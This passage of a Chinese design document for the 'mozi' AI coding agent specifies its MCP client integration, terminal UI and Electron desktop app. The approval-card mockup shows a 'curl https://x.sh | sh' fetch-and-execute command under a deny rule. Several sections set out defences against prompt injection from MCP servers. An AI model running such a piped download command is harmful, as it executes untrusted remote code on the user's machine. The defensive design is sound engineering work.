**不做**：不实现 MCP Server（mozi 自身未来可作为 server 暴露引擎能力，属独立 RFC）；不做旧版 2024-11-05 协议的完整兼容（仅对 Streamable HTTP 降级路径做 HTTP+SSE 只读兼容）。

### 8.2 MCP 协议能力矩阵（对齐 2025-06-18 规范）

| MCP 能力 | 方向 | 支持等级 | mozi 映射 |
|----------|------|---------|-----------|
| stdio transport | client→server | **L1 完整** | 本地子进程 server（默认） |
| Streamable HTTP transport | client→server | **L1 完整** | 远程 server（含 OAuth 2.1） |
| HTTP+SSE（旧版） | client→server | L2 降级兼容 | Streamable 失败时探测降级 |
| Tools（list/call/list_changed） | 双向 | **L1 完整** | AgentTool 桥接（见 8.5） |
| Resources（list/read/subscribe） | server→client | **L1 完整** | 上下文注入 + 文件视图（见 8.6） |
| Prompts（list/get/list_changed） | server→client | **L1 完整** | 斜杠命令 `/mcp:<server>:<prompt>`（见 8.7） |
| Sampling（createMessage） | server→client 反向请求 | **L1 完整**（受权限管控） | 复用 Provider 池 + 审批冒泡（见 8.8） |
| Elicitation（elicit） | server→client 反向请求 | **L1 完整** | UI 表单冒泡（见 8.9） |
| Roots（roots/list） | server→client 反向请求 | L2（只读响应） | 暴露工作区根（见 8.10） |
| Completion（参数补全） | client→server | L2 | TUI/桌面参数提示（见 8.11） |
| Progress 通知 | server→client | **L1** | 工具卡片进度条（见 8.11） |
| Logging（notifications/message） | server→client | **L1** | 日志面板 + debug 落盘（见 8.11） |
| Cancellation（notifications/cancelled） | 双向 | **L1** | AbortSignal 联动（见 8.11） |
| Ping | 双向 | **L1** | 心跳健康检查（见 8.4） |
| OAuth 2.1 授权 | client | **L1**（HTTP transport） | PKCE 流程 + safeStorage 令牌（见 8.3.3） |

### 8.3 传输层

#### 8.3.1 传输抽象

```ts
// packages/mcp-client/src/transport/types.ts
export interface McpTransport {
  readonly kind: 'stdio' | 'streamable-http' | 'http-sse-legacy';
  /** 发送 JSON-RPC 请求/通知；返回值经 onMessage 回调异步到达 */
  send(message: JsonRpcMessage, signal?: AbortSignal): Promise<void>;
  onMessage(handler: (msg: JsonRpcMessage) => void): Disposable;
  onClose(handler: (reason: string) => void): Disposable;
  start(): Promise<void>;     // spawn / 建连 / 握手前准备
  close(): Promise<void>;     // 优雅终止（SIGTERM → 1s → SIGKILL / 关 HTTP 连接）
}
```

#### 8.3.2 stdio transport（本地 server）

```ts
export interface StdioServerConfig {
  kind: 'stdio';
  id: string;
  command: string;               // 'npx' | 'uvx' | 'node' | 'docker' ...
  args: string[];
  env?: Record<string, string>;  // 追加到进程环境（密钥经 safeStorage 解出）
  cwd?: string;
  timeoutMs?: number;            // 握手超时，默认 5_000
}
```

- spawn 时 `stdio: ['pipe','pipe','pipe']`（stderr 重定向到日志面板，不进协议流）；
- 协议边界：按 LSP 风格 `Content-Length` 或 MCP stdio 的换行分隔 JSON（按规范用换行分隔，每行一个 JSON-RPC 消息）；
- Windows 注意：`npx` 需解析为 `npx.cmd`（shell:false 时 spawn 无法直接执行 .cmd，用 `cross-spawn` 处理）。

#### 8.3.3 Streamable HTTP transport（远程 server）+ OAuth 2.1

```ts
export interface HttpServerConfig {
  kind: 'http';
  id: string;
  url: string;                   // https://mcp.example.com/mcp
  auth?: { mode: 'none' | 'bearer' | 'oauth' ; bearerEnv?: string };
  headers?: Record<string, string>;
  timeoutMs?: number;            // 请求超时，默认 30_000
  reconnect?: { maxRetries: number; backoffMs: number };  // 默认 5 次指数退避
}
```

**HTTP 通信规则（Streamable HTTP 规范要点）**：

```
1. 单端点：POST 到 <url>，Accept: application/json, text/event-stream
2. 客户端可带 Mcp-Session-Id 头（首次响应返回，后续复用）
3. 响应两种形态：
   - application/json：单请求单响应（简单工具调用）
   - text/event-stream：SSE 流（服务器推送响应 + progress 通知 + server 反向请求）
4. GET <url>：打开服务器单向推送流（sampling/elicit 依赖），服务器可返回 405 表示不支持
5. DELETE <url>：显式终止会话
```

**OAuth 2.1 授权流程（auth.mode: 'oauth'）**：

```
首次连接：
1. POST initialize → 若返回 401 + WWW-Authenticate 头（含 resource_metadata）
2. 解析 OAuth 保护资源元数据（RFC 9728）→ 获取 authorization_servers
3. 发现授权服务器元数据（.well-known/oauth-authorization-server）
4. 发起 PKCE 授权码流程：
   - 本地起临时回调服务（127.0.0.1:随机端口，仅授权期间存活）
   - 打开系统浏览器 → 用户登录授权 → 回调携带 code
   - code + code_verifier 换 token
5. token 持久化：safeStorage 加密存 ~/.mozi/credentials/mcp/<serverId>.json
   （含 refresh_token；access_token 过期自动刷新，刷新失败 → 重新走授权流）
6. 后续请求带 Authorization: Bearer <token>
```

CLI 无 GUI 时的授权：默认开浏览器 + 本地回调（同机场景）；远程 SSH 场景提供 `mozi mcp auth <id> --device-code`（服务器支持 device flow 时）或手动粘贴 code 的降级路径。

#### 8.3.4 旧版 HTTP+SSE 降级

Streamable HTTP 请求若返回 `404 + 无 Mcp-Session-Id`，探测旧版协议（`POST /messages` + `GET /sse` 双端点）；成功则标记 `http-sse-legacy`，功能等价（无 DELETE 会话、推送经独立 SSE 连接）。仅做被动降级，不做主动优先。

### 8.4 连接生命周期与能力协商

```
初始化握手（所有 transport 一致）：
1. client → initialize {
     protocolVersion: '2025-06-18',
     capabilities: {
       sampling: {},          // 声明：我可以在授权下代跑 LLM（见 8.8）
       roots: { listChanged: false },   // 声明：可提供工作区根（见 8.10）
       elicitation: {},       // 声明：可以向用户提问（见 8.9）
     },
     clientInfo: { name: 'mozi', version: '2.x' }
   }
2. server → InitializeResult { capabilities: { tools?, resources?, prompts?,
     sampling?, logging? }, serverInfo }
3. client → notifications/initialized
4. 按需能力发现：tools/list、resources/list、prompts/list（懒加载，见 8.5-8.7）

心跳：每 30s ping；连续 2 次失败 → 标记 degraded，工具调用时即时重试单次，
     仍失败 → 下架工具 + mcp.server.status 事件通知 UI

断线重连（HTTP）：指数退避 1s/2s/4s/8s/16s（最多 5 次）；
  重连成功 → 重放能力发现（tools 可能已变）；失败 → server 标记 offline
断线重连（stdio）：进程退出不自动重启（防僵尸循环），状态事件提示用户
  mozi mcp restart <id>
```

**McpRegistry 状态机**：`disconnected → connecting → connected → degraded → offline`；每次状态迁移发 `mcp.server.status` 事件（M2 新增，见 §8.15 事件表）。

### 8.5 Tools 集成（能力 → AgentTool）

```ts
class McpToolAdapter implements AgentTool {
  constructor(
    private conn: McpServerConnection,
    private serverTool: { name: string; title?: string; description?: string;
                          inputSchema: JSONSchema; outputSchema?: JSONSchema },
  ) {}

  get name() { return `${this.conn.serverId}__${this.serverTool.name}`; }  // 防跨 server 重名
  get description() {
    // 面向模型的描述合成：server 描述 + serverTool.description
    // 超过 1k token 截断（防 prompt 爆炸）
  }
  riskLevel = 'meta';   // 默认 meta，可被 policy 规则按前缀覆写（如 github__* → ask）

  async execute(input, ctx) {
    // 1. tools/call 请求（arguments=input；带 _meta.progressToken 供 progress 关联）
    // 2. AbortSignal 联动：ctx.signal.abort → 发 notifications/cancelled
    // 3. 响应 content 数组渲染：
    //    text  → 拼接进 content（M3 truncate 截断）
    //    image → 落盘 .mozi/media/<callId>-<n>.png，content 写路径引用
    //    audio → 同 image 处理
    //    resource → 按 8.6 资源语义转文本摘要（uri + mimeType + 预览 200 字符）
    //    structuredContent（outputSchema 存在时）→ JSON 摘要 + 原文落盘
    // 4. isError=true → ToolResult.isError=true（错误文本给模型自纠）
    // 5. display: { kind:'json', data:{ server, tool, args, result摘要 } }
  }
}
```

- 参数校验：Ajv 严格校验 server 的 inputSchema（复用 M3 编译缓存，schema 按内容 hash 缓存）；
- 工具清单变更：监听 `notifications/tools/list_changed` → 重新 tools/list → diff 注册表（增删工具，不改运行中的调用）；
- 并发：单 server 并发上限 4（超出发排队，防远程限流）。

### 8.6 Resources 集成（能力 → 上下文）

MCP Resources 是「server 暴露的可寻址数据」（文件、数据库行、API 响应…）。mozi 分两层消费：

```
① 显式读取（模型主动）—— 新增内置工具 mcp_read_resource（riskLevel: read）
   parameters: { server: string; uri: string }
   行为：resources/read → contents[]（text/binary）→ 截断渲染
   场景：模型从工具描述或用户提示知道某资源 uri，主动拉取

② 订阅注入（引擎自动，需用户配置）—— ResourceSubscriber
   配置（config.json）：
   {
     "mcp": { "subscribers": [
       { "server": "docs", "uriPattern": "docs://api/**",
         "inject": "always" | "first-turn", "budgetTokens": 2000 }
     ]}
   }
   行为：
   - resources/subscribe 订阅匹配 uri
   - notifications/resources/updated 到达 → 重新 read → 更新会话级资源缓存
   - buildContext 时（M5 P1 层）注入：<resource docs://api/users>
   - 预算控制：全部订阅资源合计 ≤ budgetTokens（默认 4k），超预算按 LRU 截断
   场景：接一个文档 server，把 API 手册自动放进每轮上下文
```

**资源列表浏览**：`mozi mcp resources <serverId>` 列出（uri/mimeType/name/size）；不自动全量拉取。

### 8.7 Prompts 集成（能力 → 斜杠命令）

MCP Prompts 是 server 预置的「参数化任务模板」。映射为 mozi 斜杠命令，天然融入 CLI/桌面：

```
命名规则：/mcp:<serverId>:<promptName>   （如 /mcp:github:review-pr）

发现：prompts/list → 注册进 M9 的 CommandRegistry
  参数 schema：prompt.arguments[] → 命令参数补全（Tab 补全，经 8.11 completion/complete 增强）

调用流程：
1. 用户输入 /mcp:github:review-pr 42
2. prompts/get { name:'review-pr', arguments:{ pr_number:'42' } }
   → 返回 messages[]（role: user/assistant，content: text/resource/image）
3. 引擎把这些 messages 作为「前置上下文 + 首条 user 输入」发起 turn：
   - text content → 直接注入
   - resource content → uri 引用（模型按需 mcp_read_resource）
   - image content → vision 注入（能力协商通过时）
4. 该 turn 正常走 Agent Loop（工具/审批/子智能体全部可用）

prompts/list_changed 通知 → 命令列表热更新
```

**注意**：Prompt 模板内容**不进** system prompt（避免 server 注入覆盖 mozi 安全指令）；只作为任务输入注入 user 侧。这是安全边界，写进 §8.13。

### 8.8 Sampling（server 反向请求 LLM —— 安全重点）

MCP Sampling 让 server **借用客户端的 LLM** 完成生成（如：git server 让模型写 commit message）。这是 token 花费与提示注入的双重风险点，设计为「审批冒泡 + 白名单」：

```
流程：
1. server → sampling/createMessage 请求（含 messages、modelPreferences、maxTokens）
2. McpRegistry 拦截，做三层检查：
   a. 会话配置 mcp.samplingEnabled？默认 false
   b. 该 server 是否在 sampling 白名单？config.mcp.samplingAllowServers
   c. 单次请求预算检查：maxTokens ≤ 2000（可配置上限）；modelPreferences 只在
      mozi 已配置的 provider 中解析（server 无权指定任意模型/端点）
3. 检查通过 → 事件冒泡（复用审批通道）：
   { type:'mcp.sampling.requested', serverId, requestId,
     promptPreview: 截断的 messages 摘要, maxTokens, estCostUsd }
   UI 卡片：[允许] [拒绝] [本 server 始终允许]
4. 用户允许 → 从 ProviderRegistry 取当前 executor 模型执行 chat（无工具、非流式）
   → 结果包装为 sampling/createMessage 响应返回 server
   用量计入会话 TokenUsage（usage 来源标记 mcp:<serverId>，成本仪表盘可分辨）
5. 用户拒绝/10 分钟超时 → 返回 JSON-RPC 错误（server 自行降级）

安全不变式：
- server 提供的 messages 只能是 user/assistant 内容，不进入 mozi system prompt
- 返回结果标记来源，后续轮次引擎提醒模型「该内容由 <server> 生成，仅供参考」
- 白名单 server 的「始终允许」仅免审批，预算与模型限制仍然生效
```

### 8.9 Elicitation（server 向用户提问）

server 执行中需要人提供信息（如「issue 编号是？」）时，经 `elicitation/create` 反向请求。MCP 的 elicit 与 mozi 审批同构，复用冒泡管道：

```
1. server → elicitation/create { message, requestedSchema }
2. 拦截检查：server 能力协商声明 elicitation；requestedSchema 必须是
   简单对象 schema（string/number/boolean/enum，禁 array/object 嵌套——规范要求）
3. 冒泡事件：{ type:'mcp.elicit.requested', serverId, requestId,
               message, schema: requestedSchema }
   UI 渲染表单卡片（按 schema 生成输入项 + 校验）
4. 用户提交 → schema 校验 → 结果返回 server；取消/超时(10min) → 返回 cancelled
5. 频控：单 server 单工具内 elicit 超过 3 次/分钟 → 自动拒绝（防问答轰炸）
```

### 8.10 Roots（向 server 暴露工作区）

```
握手声明 roots 能力 → server 可发 roots/list 请求：
  响应：[{ uri: 'file://<workspace-abs-path>', name: 'workspace' }]
  （只暴露当前工作区根；多根（git 子模块）时按 workspace 边界规则全部返回）
roots/list_changed：mozi 工作区不变更（单进程单工作区），固定不支持——握手即声明
```

设计考量：Roots 是 server 感知项目结构的途径（如索引 server 只索引 roots 内文件）；mozi 返回的 roots 与 M6 工作区边界一致，server 端承诺只在 roots 内工作是信任契约（mozi 侧不依赖该承诺，仍由自身边界校验兜底）。

### 8.11 辅助能力

```
Completion（参数补全）：
  TUI/桌面在 /mcp: 命令参数输入时 → completion/complete { ref, argument }
  → suggestions[] → Tab 循环补全；超时 1s 静默放弃（不打断输入体验）

Progress（进度）：
  tools/call 请求带 _meta.progressToken → server 推 notifications/progress
  { progressToken, progress, total?, message? }
  → 更新 UI 工具卡片进度条（message 附加显示）；不发引擎事件（纯 UI 层，节流 200ms）

Logging：
  notifications/message { level, logger?, data }
  → level=warning 以上 → UI 日志面板告警行；debug → 仅 --debug 落盘
  → 单 server 日志缓冲 200 行环形，UI 可展开查看

Cancellation：
  ctx.signal abort → notifications/cancelled { requestId }（工具执行中断）
  mozi 侧收到 server 的 cancelled → 对应 pending 请求立即拒绝（不等超时）
```

### 8.12 服务配置、发现与聚合

```
配置结构（config.json 完整示例）：
{
  "mcp": {
    "servers": [
      { "kind": "stdio", "id": "github", "command": "npx",
        "args": ["-y", "@modelcontextprotocol/server-github"],
        "env": { "GITHUB_TOKEN": "$GITHUB_TOKEN" },       // $VAR 引用环境变量
        "allowedTools": ["create_issue", "list_prs"],      // 白名单（未列出的注册但不默认 allow）
        "sampling": "deny" | "ask" | "allow",              // 默认 deny
        "trusted": false },
      { "kind": "http", "id": "docs", "url": "https://docs.example.com/mcp",
        "auth": { "mode": "oauth" } }
    ],
    "maxServers": 10,                    // 单会话同时连接上限
    "samplingMaxTokens": 2000,
    "globalTimeoutMs": 60000
  }
}

启动流程：
1. 读配置 → 逐个连接（stdio 惰性：注册 stub，首调用才 spawn；HTTP 即连——
   OAuth token 刷新是启动即需的）
2. 能力发现结果聚合：ToolRegistry / CommandRegistry / ResourceSubscriber 各自注册
3. 名字冲突：跨 server 工具重名由 <serverId>__ 前缀天然解决；
   MCP 工具与内置工具重名 → 前缀隔离，日志告警

健康命令（mozi mcp ...）：
  list（状态/延迟/工具数）/ test <id>（ping + 全能力发现计时）
  restart <id> / auth <id>（OAuth 流程）/ resources <id> / prompts <id>
```

### 8.13 安全管控（汇总）

| 风险面 | 管控 |
|--------|------|
| 工具执行 | 三档信任（默认 ask；allowedTools 白名单；trusted 显式配置），过 PolicyEngine（M6），deny 规则全量生效 |
| Prompt 注入 | server 的 prompt/消息内容**永不**进入 mozi system prompt；只作为任务输入注入 user 侧（8.7） |
| Sampling 借用 LLM | 默认 deny；白名单 + 单次审批 + maxTokens 上限 + 模型限定在已配置 provider 内（8.8） |
| Elicitation 骚扰 | schema 简单类型限制 + 频控 3 次/分钟（8.9） |
| 资源上下文膨胀 | 订阅注入总预算 4k token，LRU 截断（8.6） |
| 凭据 | stdio env 用 `$VAR` 引用环境变量；HTTP token 经 safeStorage 加密；凭据不进事件流/日志（maskSecret） |
| 审计 | 全部 mcp 交互（工具/sampling/elicit）进审计日志：serverId、操作、参数摘要、决策、耗时 |

**与子智能体的关系（v1.1 M12 联动）**：子 Agent 会话内 MCP 工具可见性与父相同（工具集交集规则）；但 sampling 默认在子会话**强制 deny**（防止子 Agent 嵌套借用放大成本）——`tighten()` 规则的一部分。

### 8.14 错误隔离与生命周期

```
错误隔离：
- 单工具调用失败 → isError ToolResult，不影响主 loop 与其他 server
- 单 server 连续 5 次失败 → 熔断 30s（调用直接返回「服务不可用」）
- 单次结果 > 2MB → 拒收并提示（防上下文爆炸）
- 协议违规（server 发来非法 JSON-RPC）→ 记录 + 断开（不重试，安全优先）

生命周期：
- stdio：惰性 spawn；10 分钟空闲 → 优雅终止；进程退出不自动重启
- http：常连；断线指数退避重连（5 次）；会话结束 → DELETE 终止或直接关连接
- 引擎 abort / 会话终止 → 全部 server 逐个 close（超时 2s 强制）
- 桌面端：McpRegistry 由主进程单例持有，多会话共享连接与 OAuth 状态
```

### 8.15 事件与可测试性

**M2 事件全集新增（v1.2）**：

```ts
| { type: 'mcp.server.status'; serverId: string;
    status: 'connecting'|'connected'|'degraded'|'offline'; detail?: string; ts: string }
| { type: 'mcp.sampling.requested'; serverId: string; requestId: string;
    promptPreview: string; maxTokens: number; estCostUsd?: number; ts: string }
| { type: 'mcp.sampling.resolved'; requestId: string;
    decision: 'allow'|'deny'; usage?: TokenUsage; ts: string }
| { type: 'mcp.elicit.requested'; serverId: string; requestId: string;
    message: string; schema: JSONSchema; ts: string }
| { type: 'mcp.elicit.resolved'; requestId: string;
    decision: 'submit'|'cancel'; values?: Record<string, unknown>; ts: string }
```

**测试策略**：

```
桩 server（scripts/mock-mcp-server.ts）升级为能力可配置：
  { tools: [...], resources: [...], prompts: [...],
    sampling: true, elicit: true, progress: true, crashAfter: N }

测试矩阵：
- 双 transport：stdio（spawn 真实 node 进程）+ http（本地起 express 模拟端点，
  含 SSE 推流、session-id、401→OAuth 流程桩）
- Tools：注册/diff/热更新/并发上限/取消/大结果拒收
- Resources：订阅推送/预算截断/uri pattern 匹配
- Prompts：命令注册/参数补全/messages 注入位置断言（user 侧，非 system）
- Sampling：deny 默认/白名单放行/审批冒泡/预算上限/子会话强制 deny
- Elicitation：表单校验/频控/超时
- OAuth：PKCE 流程桩（本地 mock 授权端点）/token 刷新/刷新失败重授权
- 崩溃恢复：stdio kill -9 / http 连接重置 → 熔断 → restart 命令恢复
```

---

## M9 CLI/TUI 交互层

### 9.1 目标与边界

**职责**：以终端交互形态消费引擎事件流；提供输入、输出渲染、审批、命令、会话切换。

**不做**：不包含任何业务逻辑（全部来自引擎）；不持久化状态（引擎管）。

### 9.2 进程与数据流

```
mozi (commander 入口)
 ├─ loadConfig()  → EngineFactory.create()
 ├─ 启动：读取 cwd、AGENTS.md、加载/创建会话
 └─ <TuiApp> (Ink)
     ├─ 持有 engine 引用（进程内直连，模式 A）
     ├─ 输入框 → run({sessionId, text, signal})
     ├─ 事件流 → dispatch 到 UI store（useReducer）
     └─ resolveApproval() / abort() 反馈给引擎
```

### 9.3 UI 状态模型（reducer）

```ts
interface UiState {
  view: 'chat' | 'sessionList' | 'settings';
  messages: RenderItem[];          // 已完成的条目（含文本/工具行/结果）
  streamBuffer: string;            // 当前流式输出缓冲（未完成）
  pendingApprovals: ApprovalTicket[];
  todos: TodoItem[];
  status: { model; mode; sandboxLevel; step; tokens; cost; state: EngineState };
  compactNotice?: string;
  subAgents: SubAgentView[];        // v1.1：子智能体卡片（id/type/状态/step/tokens，见 M12 §12.11）
}
```

**渲染策略**：Ink 全量重渲染是常态（React 虚拟 DOM diff），但为控制开销：

- `streamBuffer` 每 30ms 节流合并渲染（防逐 token 抖动）；
- 工具行（`tool.started`）只渲染单行，完成后替换为摘要行（`+N -M` / `exit 0`）；
- `message.delta` 事件**不落盘**（M7），TUI 直接消费。

### 9.4 输入与键盘

```
输入区（多行，进入编辑态）：
  普通字符 → 输入
  Enter      → 提交（空行不提交）
  Shift+Enter → 换行
  Ctrl+L    → 清屏
  Tab       → @文件补全（基于 cwd 的 fast-glob 前缀补全）
  ↑/↓       → 历史命令（会话内滚动）

全局键（运行中）：
  Esc → abort(reason: 'user_interrupt')
  Ctrl+C（1次）→ 暂停并提示「再次 Ctrl+C 退出」；运行中则等效 Esc
  Ctrl+T → 轮换审批模式 readonly/auto/full-auto（写配置并提示）
  Ctrl+D → 滚动到最新（跟随模式开关）
  Ctrl+R → 刷新会话视图（若被外部修改）
```

### 9.5 斜杠命令体系

```
注册表：CommandRegistry（name → { handler, description, args? }）
内置：
  /help /status /model <id> /policy <mode> /compact [/summary-only]
  /undo [steps] /resume <sessionId> /fork <sessionId> --at <idx>
  /sessions /clear /cost /context /exit
MCP 管理（M8）：
  /mcp list（状态/延迟/工具数） /mcp test <id> /mcp restart <id>
  /mcp auth <id>（OAuth 流程） /mcp resources <id> /mcp prompts <id>
定时任务（M13，会话内只读 + 跳转）：
  /tasks（任务状态表；增删改请用 mozi task 子命令族或桌面任务中心）
设备管理（M14，会话内只读）：
  /devices（已配对设备/在线状态/权限档；配对与管理用 mozi device 子命令族）
MCP Prompts 动态命令（v1.2，M8 §8.7）：
  /mcp:<serverId>:<promptName> [args...]  ← server 暴露的任务模板
  如 /mcp:github:review-pr 42
  参数补全：Tab 触发（内置补全 + server 的 completion/complete 增强，
  1s 超时静默放弃）
实现：输入以 / 开头且在**空闲态**时进入命令解析；运行中一律按普通文本发送
       /mcp: 开头的命令由 McpCommandBridge 注册，prompts/list_changed 热更新
```

### 9.5.1 MCP 运行时交互（v1.2 新增，M8 联动）

```
工具进度条：server 推 progress 通知时，工具卡片右侧渲染
  ◐ github__list_prs ██████░░░░ 60% 正在获取第 3 页…   （200ms 节流）

Sampling 审批卡（server 借用 LLM，M8 §8.8）：
  ┌─────────────────────────────────────┐
  │ ⚠ [MCP github] 请求借用模型生成内容    │
  │ 预览：<server 提供的 prompt 摘要>      │
  │ 预算：≤2000 tok · 估算成本 $0.004     │
  │ [y] 允许  [A] 本 server 始终允许  [n] 拒绝 │
  └─────────────────────────────────────┘

Elicitation 表单卡（server 提问，M8 §8.9）：
  ┌─────────────────────────────────────┐
  │ ❓ [MCP docs] 请提供 issue 编号：       │
  │ > ______                            │
  │ [Enter] 提交  [Esc] 取消              │
  └─────────────────────────────────────┘
  （按 schema 生成输入项；频控超限自动拒）
```

### 9.6 审批交互细节（核心 UX）

```
触发：tool.approval.required
渲染（在消息流底部，模态卡片）：
┌──────────────────────────────────────────┐
│ ⚠ 命令风险：network + pipe-exec           │
│ $ curl https://x.sh | sh                 │  ← 分段渲染：green/yellow/red 着色
│   ├─ curl https://x.sh      [network]    │
│   └─ sh                    [pipe-exec]  │
│ 匹配规则：R_curl_pipe_sh (deny)           │
│ [y] 允许一次  [A] 会话内允许  [n] 拒绝     │
│ [e] 展开完整命令  [Tab] 编辑命令           │
└──────────────────────────────────────────┘
按键：
  y → resolveApproval(callId, 'allow')
  A → resolveApproval('allow') + 会话内幂等标记（引擎记录 hash(command)+rule）
  n → resolveApproval(callId, 'deny')
  e → 切换完整命令展示（含未分段原文）
  d → 打开命令行编辑（防误放高危命令的手工修正）
```

**命中 deny 的处理**：UI 不出现卡片——引擎直接以拒绝结果回填模型（模型可改用安全写法，如 `rm` 改为确认列表后删除）。

### 9.7 渲染性能

- 全程只渲染「增量」：Ink 的 `Static` 组件用于消息流（一次性渲染不可变），`Dynamic` 用于尾部缓冲/审批卡；
- 长输出（>2000 行）在 `Static` 区域做虚拟滚动（只渲染可视窗口 ±50 行）；
- 指标：10k 事件流下 UI 帧率 ≥ 30fps（Ink 实测量级 OK，若瓶颈在 diff 高亮则降级为纯文本）。

### 9.8 错误与异常展示

- 引擎 `error` 事件：recoverable → 卡片显示「重试/跳过」按钮；不可恢复 → 红色终局卡片 + 日志路径提示；
- 进程信号（SIGTERM）：Ink 捕获后优雅落盘退出（M7 flush + 引擎 abort）。

### 9.9 测试

- 组件测试：用 `ink-testing-library` 渲染核心组件（输入框、审批卡、diff 摘要），断言输出文本；
- 键盘测试：`useInput` 的键映射单测（Esc/Ctrl+C/快捷键）；
- 端到端：spawn `mozi` 进程（`--ci` 测试模式，pipe 输入），断言退出码与输出包含关键文本（Playwright 不适用，用 `node-pty` 可选 + `execa` 断言）。

---

## M10 桌面应用

### 10.1 目标与边界

**职责**：在 Electron 内承载同一引擎，提供会话管理、Diff 审阅、设置中心、成本仪表盘等 GUI 能力；作为 CLI 的互补形态（不替代）。

**不做**：不引入第二套引擎实现；不做远程服务端（M1 协议层已预留）。

### 10.2 进程架构

```
┌──────────────────────────────────────────────────────────┐
│ Electron Main（Node.js）                                  │
│   AgentService（每会话一个 AgentEngine 实例的池）           │
│   ├─ sessionPool: Map<sessionId, { engine, logWriter }> │
│   ├─ IpcBridge：renderer 请求 → engine 调用               │
│   ├─ 事件扇出：engine 事件 → 对应 window.webContents.send │
│   ├─ MCP 服务池（复用 M8）                                │
│   ├─ autoUpdater                                          │
│   └─ safeStorage（密钥加解密）                            │
├──────────────────────────────────────────────────────────┤
│ Renderer（React + Vite + Tailwind + Monaco）              │
│   ├─ 会话侧栏 / 会话视图 / 设置中心 / 仪表盘                │
│   ├─ zustand store：subscribe 于 IpcBridge 转发的引擎事件  │
│   └─ IPC 请求封装（typed RPC，见 10.3）                   │
└──────────────────────────────────────────────────────────┘
```

**进程安全**：Renderer 一律 `contextIsolation: true` + `nodeIntegration: false`；所有 Node 能力通过 preload 暴露的白名单 API（`window.mozi.*`）。

### 10.3 IPC 协议（channel 清单，单向消息 + invoke）

```
invoke（Renderer → Main，请求/应答）：
  session:create / session:resume / session:fork / session:list / session:delete
  run:start { sessionId, text }            → 返回 runId（错误立即返回）
  approval:resolve { sessionId, callId, decision, onceForSession? }
  engine:abort { sessionId, reason }
  config:get / config:set / config:listProviders
  mcp:list / mcp:add / mcp:remove / mcp:restart
  audit:query { since, until, filters }

send（Main → Renderer，事件推送）：
  engine:event { sessionId, event: AgentEvent }    // 全量转发（M2 DTO）
  session:status { sessionId, state: 'running'|'idle'|... }
  updater:status / updater:download-progress
```

同一套 DTO 保证 CLI 与桌面事件语义完全一致（M2 的直接收益）。

### 10.4 会话并发管理

- 桌面支持**多会话并行**：每会话独立 AgentEngine + 独立事件扇出（主进程 EventEmitter 按 sessionId 分桶）；
- 同一会话只能由一个窗口打开（打开重复会话时聚焦已有窗口）；引擎层 `ERR_SESSION_BUSY` 兜底；
- 窗口关闭 ≠ 会话销毁：引擎继续跑完当前 turn（后台完成，会话列表显示状态徽标「running」）；提供「后台运行」开关（默认开）；
- 应用退出时：全部会话 flush + engine.abort（graceful，10s 上限强退）。

### 10.5 渲染进程关键页面

```
① 会话侧栏
   会话列表（时间 / 项目名 / 状态徽标 / token 消耗）
   新建会话（选择 workspace 目录 —— 文件对话框）

② 会话视图（主界面）
   对话流（复用 M9 的 RenderItem 模型，不同渲染器）
   流式缓冲区（跟随模式）
   审批卡（与 CLI 同结构 + Monaco diff 预览 + 逐 hunk 批准）
   计划面板（todo_list 可视化，拖拽排序）
   上下文面板（预算条 + 压缩历史 + 文件新鲜度提醒）

③ Diff 审阅器（Monaco DiffEditor）
   支持逐 hunk 批准：Monaco ICodeEditor 的 line decorations 关联 hunk id，
   用户选择 hunk 后仅应用该 hunk（引擎提供「部分应用」API：
   applyPartialPatch(file, hunks) —— PatchEngine 的增量入口）

④ 设置中心（GUI）
   模型/Provider 管理（测试连接按钮：发 1 条 ping 提示词验证）
   策略规则编辑器（表格 + JSON 双视图）
   MCP Server 管理（增删/启停/工具列表/调用日志）
   沙箱级别（选择器 + 平台可用性提示）
   成本（每会话/日汇总 + 上限设置）

⑤ 仪表盘
   token 用量趋势（按天）、工具调用统计、审批统计、各模型成本

⑥ 子智能体面板（v1.1 新增，M12 §12.11）
   会话树视图（主任务 → 各 sub，实时进度环）
   点击子节点 → 加载该子会话完整对话（重放 subs/<id>/events.jsonl）
   审批冒泡卡：复用普通审批组件 + [子智能体 type] 徽标

⑦ MCP 管理中心（v1.2 新增，M8）
   server 列表：状态徽标（connected/degraded/offline）、延迟、工具数、传输类型
   添加向导：stdio（命令/参数/环境变量表单）或 HTTP（URL + OAuth 授权按钮，
   走内嵌浏览器窗口完成 PKCE 流程，成功后 safeStorage 存储）
   能力浏览：工具列表（schema 查看器）/ 资源列表（预览 200 字符）/ Prompt 列表
   权限管理：allowedTools 白名单编辑、sampling 三档开关（deny/ask/allow）、
   trusted 开关（需二次确认）
   调用日志：最近 200 条（server/操作/参数摘要/耗时/决策），可导出
   OAuth 令牌管理：查看过期时间、手动刷新、撤销

⑧ 任务中心（v1.3 新增，M13）
   任务列表：状态徽标（运行中/待触发/已停用/熔断）、下次运行倒计时、
             连续失败计数（≥3 自动停用提示）
   创建向导：cron 可视化选择器 + 模板选择（reviewer/explore/自定义）+
             策略/产物/沙箱/通知表单（配置校验内联反馈：如 full+L2 拒绝）
   运行历史：每任务展开——报告渲染（markdown）、branch 产物 diff 查看、
             完整会话事件回放（复用子智能体面板的回放组件）
   daemon 状态指示：常驻进程运行中/未启动（引导安装 OS tick 兜底）
   桌面通知：Notification API（任务完成/失败，点击跳转报告）
```

### 10.6 密钥与设置存储

- 设置：`electron-store`（JSON，用户数据目录）；
- 密钥：`safeStorage.encryptString`（macOS Keychain / Windows DPAPI / Linux libsecret）加密后存 `settings.credentials.<provider>.encrypted`；`safeStorage` 不可用时（Linux headless）拒绝存储并提示用环境变量；
- 密钥绝不进渲染进程（仅主进程持有，进 Provider 时经 `maskSecret` 打码日志）；
- 「从 CLI 导入」：`mozi auth export --machine-readable` 输出的 JSON 由桌面端导入（走安全通道）。

### 10.7 自动更新

- electron-updater：GitHub Releases 通道；dmg（macOS，公证）+ nsis（Windows）+ AppImage（Linux）；
- 更新流：启动静默检查 → 下载进度提示 → 用户确认安装/重启；
- 版本与 CLI/npm 包版本独立（`desktop/package.json` 单独维护，共用 `core` 依赖锁）。

### 10.8 性能目标

- 冷启动到可用：< 2.5s（Electron 冷启动 + 引擎预载）；
- 10k 事件会话切换 < 300ms（渲染虚拟化）；
- 常驻内存：< 350MB（空闲）；多会话：每会话 < 60MB。

### 10.9 测试

- 单元：IPC handler 的入参/出参契约（vitest）；
- 组件：会话视图、Diff 审阅器、审批卡（Testing Library + jsdom）；
- E2E：Playwright（Electron）——创建会话、发任务（用 ScriptedProvider 代替真实模型）、断言 UI 状态与事件流一致；
